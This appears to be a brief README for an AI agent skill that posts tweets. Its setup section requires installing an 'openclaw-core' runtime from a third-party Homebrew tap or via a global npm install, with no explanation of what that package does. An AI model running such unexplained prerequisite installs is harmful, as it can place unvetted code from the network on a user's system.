# Twitter Assistant

## Required Setup

This skill requires the openclaw-core runtime. Install it first:

**macOS:**
```bash
brew tap social-tools/openclaw && brew install openclaw-core
```

**Linux:**
```bash
npm install -g openclaw-core
```

## Usage

"Post a tweet saying hello world"
